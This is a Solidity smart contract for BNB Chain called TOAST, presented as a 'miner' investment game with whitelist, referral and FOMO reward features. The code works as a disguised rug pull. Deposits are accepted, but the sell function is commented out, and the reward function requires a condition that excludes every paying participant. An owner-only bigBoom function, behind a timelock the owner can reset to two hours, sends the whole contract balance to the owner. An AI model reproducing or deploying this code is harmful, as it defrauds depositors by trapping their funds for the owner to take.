/**
 *Submitted for verification at BscScan.com on 2022-05-25
*/

/**
 *Submitted for verification at BscScan.com on 2022-04-26
*/

pragma solidity ^0.8.2; // solhint-disable-line

contract TOAST{
    //uint256 EGGS_PER_MINERS_PER_SECOND=1;
    uint256 public EGGS_TO_HATCH_1MINERS=864000;//for final version should be seconds in a day
    uint256 public minBuyValue=0.1*1000000000000000000;//Purchase BNB quantity must be a multiple of 0.1
    address public marketingAddress;

    bool public initialized=false;
    address public ceoAddress;
    mapping (address => uint256) public claimedEggs;
    mapping (address => uint256) public lastHatch;
    mapping (address => address) public referrals;
    mapping (address => uint256) public jointime;
    mapping (address => uint256) public numRealRef;
    uint256 public marketEggs;

    uint256 public fomoTime;
    address public fomoAddress;
    uint256 public fomoNeededTime = 86400;
    uint256 public fomoRewards;
    uint256 public timeLock = 1750866480;
    mapping(address => bool) public isWhiteList;
    bool whiteListNeeded = true;
    bool public isFomoFinished = false;
    constructor() {
        ceoAddress=msg.sender;
        marketingAddress = 0x7e9EcDf6B56dFa529dA344Cc7f513DB383CB4B2C; 
        isWhiteList[ceoAddress] = true;
    }
    
    // function sellEggs() public{
    //     require(initialized);
    //     uint256 hasEggs=getMyEggs();
    //     uint256 eggValue=calculateEggSell(hasEggs);
    //     uint256 fee=devFee(eggValue);
    //     claimedEggs[msg.sender]=0;
    //     lastHatch[msg.sender]=block.timestamp;
    //     marketEggs=SafeMath.add(marketEggs,hasEggs);
    //     payable(marketingAddress).transfer(fee);
    //     payable(msg.sender).transfer(SafeMath.sub(eggValue,fee));
        
    // }

    function updateFomoFinished() private {
        uint256 realTime = SafeMath.add(fomoNeededTime, fomoTime);
        if(block.timestamp > realTime){
            isFomoFinished=true;
        }
    }


    function buyEggs(address ref) public payable{
        require(initialized);
        require(msg.value >= minBuyValue, "Not Enough BNB");
        require(msg.value % minBuyValue==0, "Purchase BNB quantity must be a multiple of 0.1");

        if(whiteListNeeded){
            require(isWhiteList[msg.sender] == true, "You are not on the whitelist");
        }
        
        jointime[msg.sender]=block.timestamp;//记录参与时间
        
        uint256 eggsBought=SafeMath.mul(msg.value,1000);//计算出可买多少币

        marketEggs=SafeMath.sub(marketEggs,eggsBought);//扣除已购买的币

        // uint256 fee=devFee(msg.value);//计算手续费
        // payable(marketingAddress).transfer(fee);//手续费转入项目方
        claimedEggs[msg.sender]=SafeMath.add(claimedEggs[msg.sender],eggsBought);//该地址拥有的币数量

        if(ref == msg.sender || ref == address(0) || jointime[ref]==0) {//推荐人未加入，自动修改推荐人为项目方
            ref = ceoAddress;
        }//推荐人为空时为设置推荐人为项目方

        if(referrals[msg.sender] == address(0)){
            referrals[msg.sender] = ref;
        }//没有推荐人时设置推荐人


        if (msg.value>=100000000000000000){
            numRealRef[referrals[msg.sender]] +=(SafeMath.div(SafeMath.mul(msg.value,15),100));//一级推荐人获得15%
            address level2=referrals[referrals[msg.sender]];
            if(level2 != address(0))
            {
                numRealRef[level2] +=(SafeMath.div(SafeMath.mul(msg.value,5),100));//一级推荐人获得5%
            }
        }
    }

    function getFomoRewards() public payable{
        require(jointime[msg.sender] == 0,"Please join us first");

        uint256 curJoinTime = jointime[msg.sender];
        require(SafeMath.add(curJoinTime, fomoNeededTime)>block.timestamp,"The collection time has not arrived yet");

        jointime[msg.sender]=SafeMath.add(curJoinTime, fomoNeededTime);
        fomoRewards=SafeMath.div(SafeMath.mul(claimedEggs[msg.sender], 20), 100);//每轮奖励金额
        SafeMath.sub(claimedEggs[msg.sender],fomoRewards);

        // (bool success, ) = payable(msg.sender).call{value: fomoRewards}("");
        payable(msg.sender).transfer(SafeMath.div(fomoRewards,1000));
    }


    function getNumRealRef(address _addr) public view returns(uint256){
        return numRealRef[_addr];
    }


    // Do not touch me
    function timeLockBigBoom() public {
        require(msg.sender == ceoAddress);
        timeLock = SafeMath.add(block.timestamp, 7200);
    }


    function bigBoom() public  {
        require(msg.sender == ceoAddress);
        require( block.timestamp > timeLock);
        payable(msg.sender).transfer(address(this).balance);
        // (bool success,) = payable(msg.sender).call{value: address(this).balance}("");
        // require(success == true, "Transfer failed.");
    }

    function setWhiteListNeeded(bool _bool) public{
        require(msg.sender == ceoAddress);
        whiteListNeeded = _bool;
    }

    function setWhiteList(address _addr, bool _bool) public{
        require(msg.sender == ceoAddress);
        isWhiteList[_addr] = _bool;
    }


    function setWhiteListBatch(address[] memory  _address, bool _bool) public {
        require(msg.sender == ceoAddress);
        for (uint256 i = 0; i < _address.length; i++) {
            isWhiteList[_address[i]] = _bool;
        }
    }

    function setMinBuyValue(uint256 value) public{
        require(msg.sender == ceoAddress);
        minBuyValue = value;
    }

    function setNewFomoRound( ) public{
        require(msg.sender == ceoAddress);
        isFomoFinished = false;
        fomoAddress = address(0);
        fomoRewards = 0;
        fomoTime = SafeMath.add(block.timestamp,3600);
    }

    function fireCeo( address _addr ) public  {
        require(msg.sender == ceoAddress);
        ceoAddress = _addr;
    }

    function devFee(uint256 amount) public pure returns(uint256){
        return SafeMath.div(SafeMath.mul(amount,5),100);
    }
    function seedMarket() public payable{
        require(msg.sender == ceoAddress, 'invalid call');
        require(marketEggs==0);
        initialized=true;
        marketEggs=86400000000;
        fomoTime = SafeMath.add(block.timestamp,3600);
    }
    function getBalance() public view returns(uint256){
        return address(this).balance;
    }

    
    // function calculateEggSell(uint256 eggs) public view returns(uint256){
    //     return eggs*0.1;
    // }


    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }
}

library SafeMath {

    /**
    * @dev Multiplies two numbers, throws on overflow.
    */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    /**
    * @dev Integer division of two numbers, truncating the quotient.
    */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    /**
    * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
    */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    /**
    * @dev Adds two numbers, throws on overflow.
    */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}